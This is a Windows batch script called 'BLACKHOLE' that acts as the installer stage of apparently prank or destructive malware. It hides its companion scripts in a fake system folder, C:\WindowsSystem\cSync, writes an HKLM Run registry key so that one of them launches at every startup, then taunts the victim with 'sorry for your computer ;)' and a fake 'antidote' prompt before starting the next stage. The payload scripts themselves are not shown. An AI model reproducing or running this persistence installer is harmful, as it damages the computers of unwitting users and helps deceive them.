@echo off
Title BLACKHOLE
mode con cols=260 lines=260
color 4
type logo.txt
MD C:\WindowsSystem >NUL
MD C:\WindowsSystem\aSync >NUL
MD C:\WindowsSystem\bSync >NUL
MD C:\WindowsSystem\cSync >NUL
powershell.exe Move-Item -Path "LaunchBH1.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH2.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH3.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH4.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH5.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH6.vbs" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH7.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH8.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH9.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBH10.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "LaunchBHStart.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "IDIOT.bat" -Destination "C:\WindowsSystem\cSync"
powershell.exe Move-Item -Path "logo.txt" -Destination "C:\WindowsSystem\cSync"
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v 01 /t REG_SZ /d "C:\WindowsSystem\cSync\LaunchBH2.bat" /f >NUL
echo sorry for your computer ;)
echo PRESS ANY KEYS TO HAVE THE ANTIDOTE
timeout 7
start C:\WindowsSystem\cSync\LaunchBHStart.bat
powershell.exe Move-Item -Path "LaunchBH.bat" -Destination "C:\WindowsSystem\cSync"


